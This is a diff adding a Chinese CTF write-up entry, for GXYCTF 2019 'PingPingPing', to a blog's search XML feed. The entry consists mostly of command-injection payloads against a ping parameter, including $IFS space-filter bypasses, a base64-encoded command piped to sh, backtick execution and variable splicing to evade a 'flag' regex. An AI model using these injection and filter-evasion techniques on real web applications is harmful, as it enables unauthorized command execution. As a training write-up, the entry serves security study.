@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>GXYCTF:2019-PingPingPing</title>
+      <link href="2021/06/10/gxyctf-2019-pingpingping/"/>
+      <url>2021/06/10/gxyctf-2019-pingpingping/</url>
+      
+        <content type="html"><![CDATA[<p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610215732594.png" alt="image-20210610215732594"></p><pre><code>/?ip=127.0.0.1;cat /flag</code></pre><p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610215809393.png" alt="image-20210610215809393"></p><pre><code>/?ip=127.0.0.1;ls</code></pre><p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610215833127.png" alt="image-20210610215833127"></p><pre><code>/?ip=127.0.0.1;cat$IFS$1index.php</code></pre><p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610220021619.png" alt="image-20210610220021619"></p><h3 id="sh，bash下编码"><a href="#sh，bash下编码" class="headerlink" title="sh，bash下编码"></a>sh，bash下编码</h3><pre><code>/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre><p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610220126890.png" alt="image-20210610220126890"></p><h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><h4 id="1-将反引号内命令的输出作为输入执行"><a href="#1-将反引号内命令的输出作为输入执行" class="headerlink" title="1.将反引号内命令的输出作为输入执行"></a>1.将反引号内命令的输出作为输入执行</h4><pre><code>?ip=127.0.0.1;cat$IFS$1`ls`</code></pre><p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610220226315.png" alt="image-20210610220226315"></p><h4 id="2-拼接控制参数"><a href="#2-拼接控制参数" class="headerlink" title="2.拼接控制参数"></a>2.拼接控制参数</h4><pre><code>?ip=1;a=f;d=ag;c=l;cat$IFS$a$c$d.php</code></pre><pre><code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre><ul><li><p>?ip=127.0.0.1;a=f;cat$IFS$1$alag.php    过滤</p></li><li><p>?ip=127.0.0.1;a=l;cat$IFS$1f$aag.php    有request，但没flag</p></li><li><p>?ip=127.0.0.1;a=a;cat$IFS$1fl$ag.php      过滤</p></li><li><p>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php    有flag</p><pre><code>if(preg_match("/.*f.*l.*a.*g.*/", $ip)){    die("fxck your flag!");</code></pre></li></ul>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 命令执行 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Web:LFI漏洞</title>
       <link href="2021/06/09/web-lfi-lou-dong/"/>
       <url>2021/06/09/web-lfi-lou-dong/</url>
